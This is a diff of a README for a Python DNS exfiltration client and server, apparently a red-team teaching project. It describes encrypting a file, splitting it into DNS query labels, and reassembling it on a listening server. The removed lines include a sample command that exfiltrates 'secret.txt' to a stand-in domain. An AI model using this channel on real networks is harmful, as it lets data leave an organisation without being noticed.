@@ -1,148 +1,111 @@
-# 🧬 Python DNS Exfiltration Client & Server
+# DNS Exfiltration Server
 
-This project demonstrates how data can be exfiltrated over DNS using a Python-based client-server architecture. The client reads a file, encrypts and encodes its contents, and transmits the data via DNS queries. The server listens for these queries, decodes and decrypts the data, and reconstructs the original file.
+This is a DNS exfiltration server designed to receive encrypted file fragments via DNS A record queries. The system supports encrypted and authenticated transmission using modern cryptographic primitives.
 
-> ⚠️ **Disclaimer**: This tool is intended for educational and research purposes only. Unauthorized use against systems without explicit permission is illegal and unethical.
+## 🔐 Key Features
 
----
-
-## 📂 Project Structure
-
-- `client.py`: Encrypts and encodes the file, then sends data chunks via DNS queries.
-- `server.py`: Listens for incoming DNS queries, decodes and decrypts the data, and reconstructs the original file.
-- `.env`: Stores the AES encryption key used by both client and server.
-- `requirements.txt`: Lists the Python dependencies required for the project.
-- `LICENSE`: GPL-3.0 License.
+- **Perfect Forward Secrecy (PFS)** via ephemeral Elliptic Curve Diffie-Hellman (ECDH) using X25519
+- **Authenticated encryption** using AES-GCM with derived session keys
+- **Base32 encoding** for DNS-safe payloads
+- **UDP DNS server** that reassembles fragments and decrypts payloads on the fly
+- **Stateless file-based session reassembly** keyed by client ephemeral identifier
+- **Replay-resilient per-transfer encryption context** via ECDH
 
 ---
 
-## 🔐 Encryption
+## 🔧 How It Works
 
-- Uses **AES-GCM (256-bit)** encryption for confidentiality and integrity.
-- Each session uses a random 12-byte nonce.
-- Ciphertext is Base32-encoded (unpadded) for DNS-safe transmission.
+1. **Key Exchange (ECDH):**
+   - Each client generates a new ephemeral X25519 key pair.
+   - The client sends its public key in Base32 chunks encoded in the DNS query (using chunk `0-0`).
+   - The server derives a shared secret using its private key and the client's public key.
+   - This secret is passed through an HKDF (HMAC-based Key Derivation Function) to produce a 256-bit AES-GCM key.
 
-### Environment Variable
+2. **Encrypted Data Transfer:**
+   - The client encrypts the file using the derived AES key with a 12-byte random nonce.
+   - The ciphertext is Base32-encoded (unpadded), then split into DNS-safe segments.
+   - Each segment is sent as a query of the format:
+     ```
+     <id>-<index>-<total>-<chunk>.<domain>
+     ```
 
-Create a `.env` file in the root directory with the following:
+3. **Decryption and Reassembly:**
+   - When all chunks are received, the server Base32-decodes and AES-decrypts the full payload.
+   - The decrypted binary is saved to disk under the `output/` directory.
 
-```env
-EXFIL_KEY=<your 64-character hex key>
+---
+
+## 📂 Environment Variables
+
+Create a `.env` file in the root directory:
+
+```ini
+SERVER_PRIVATE_KEY=server.key
 ```
 
-You can generate a 256-bit key with:
+The private key should be a 32-byte raw X25519 key. You can generate one with Python:
 
 ```bash
-head -c 32 /dev/urandom | xxd -p -c 32
+python -c "from cryptography.hazmat.primitives.asymmetric import x25519; from cryptography.hazmat.primitives import serialization; key = x25519.X25519PrivateKey.generate(); open('server.key', 'wb').write(key.private_bytes(encoding=serialization.Encoding.Raw, format=serialization.PrivateFormat.Raw, encryption_algorithm=serialization.NoEncryption()))"
 ```
 
-> ⚠️ The same key must be used on both the client and the server for successful decryption.
+This file will be used automatically unless overridden with `--server-key`.
 
 ---
 
-## ⚙️ Features
-
-### Client (`client.py`)
-
-- Encrypts file contents using AES-GCM.
-- Base32-encodes the encrypted data.
-- Splits encoded data into DNS-safe chunks.
-- Sends chunks via DNS A queries using `dnslib`.
-- Uses a unique session identifier per file.
-
-### Server (`server.py`)
-
-- Listens on UDP port 5300 for DNS queries.
-- Extracts and reassembles chunks by session ID.
-- Base32-decodes the payload.
-- Decrypts using AES-GCM.
-- Saves the original file to disk.
-
----
-
-## 🛠️ Installation
-
-1. **Clone the Repository**
-
-   ```bash
-   git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
-   cd python-dns-exfiltration-client-server
-   ```
-
-2. **Install Dependencies**
-
-   It's recommended to use a virtual environment:
-
-   ```bash
-   python3 -m venv venv
-   source venv/bin/activate
-   pip install -r requirements.txt
-   ```
-
-3. **Create `.env` file with encryption key**
-
-   ```bash
-   echo "EXFIL_KEY=$(head -c 32 /dev/urandom | xxd -p -c 32)" > .env
-   ```
-
----
-
-## 🚀 Usage
-
-### Start the Server
+## 🚀 Running the Server
 
 ```bash
-python3 server.py
+python server.py --port 5300 --domain xf.example.com
 ```
 
-- The server will start listening on UDP port 5300.
-- Decrypted files are written to the `output/` directory.
+Alternatively, provide your server key via `.env`.
 
-### Run the Client
+---
+
+## 🔐 Cryptographic Design: Ephemeral Key Exchange
+
+This system is designed with **Perfect Forward Secrecy** in mind:
+
+- Clients generate a fresh X25519 ephemeral key for each file transfer.
+- The server's static private key (provided via `.env`) is used to derive a shared secret.
+- This secret is then fed into an HKDF to derive a per-transfer AES-GCM key.
+- The AES key is used only once — for the current file transfer.
+
+This ensures that even if a long-term key is compromised, past data cannot be decrypted.
+
+---
+
+## ⚠️ Notes on Security
+
+- Every transfer uses a fresh ephemeral keypair, ensuring **forward secrecy**.
+- AES-GCM provides **integrity and confidentiality**.
+- Replay protection and client authentication are not currently implemented — consider adding HMAC or signatures for production scenarios.
+- Sessions are ephemeral and stateless beyond active memory — no persistent logs are maintained.
+
+---
+
+## 📁 Output
+
+Decrypted files are saved to the output directory (`--output-dir`, default: `output/`).
+
+---
+
+## 🧪 Interoperability
+
+This server is designed to interoperate with the [Python or Go-based DNS exfiltration client](https://github.com/bufo333/python-dns-exfiltration-client-server), provided they conform to the same key-exchange and chunking conventions.
+
+---
+
+## 🛠️ Options
 
 ```bash
-python3 client.py <file_path> <domain>
-```
-
-- `<file_path>`: Path to the file you want to exfiltrate.
-- `<domain>`: The domain name to which the DNS queries will be sent.
-
-**Example:**
-
-```bash
-python3 client.py secret.txt exfil.example.com
+usage: server.py [-h] [--port PORT] [--output-dir DIR] [--low LOW] [--high HIGH] [--domain DOMAIN] [--server-key PATH]
 ```
 
 ---
 
-## 📌 Notes
+## 👤 Author
 
-- Ensure that the domain (`exfil.example.com`) is configured to point to the server's IP address.
-- The server must have permissions to bind to the specified UDP port.
-- This tool is for educational purposes. Always obtain authorization before using on any network.
-
----
-
-## 📄 License
-
-This project is licensed under the GNU General Public License v3.0. See the [LICENSE](LICENSE) file for details.
-
----
-
-## 🤝 Acknowledgments
-
-Inspired by various DNS exfiltration techniques and tools in the cybersecurity and red-team communities.
-
----
-
-## 🧠 Learn More
-
-For deeper insights into DNS-based data exfiltration:
-
-- [DNS Exfiltration Techniques](https://attack.mitre.org/techniques/T1048/)
-- [How DNS Tunneling Works – Detection & Response](https://www.socinvestigation.com/how-dns-tunneling-works-detection-response/)
-- [DNS Exfiltration & Tunneling: How it Works](https://helgeklein.com/blog/dns-exfiltration-tunneling-how-it-works-dnsteal-demo-setup/)
-
----
-
-*Happy Learning! Stay Ethical and Informed.*
+John Burns — 2025-05-02  
+Version 2.2
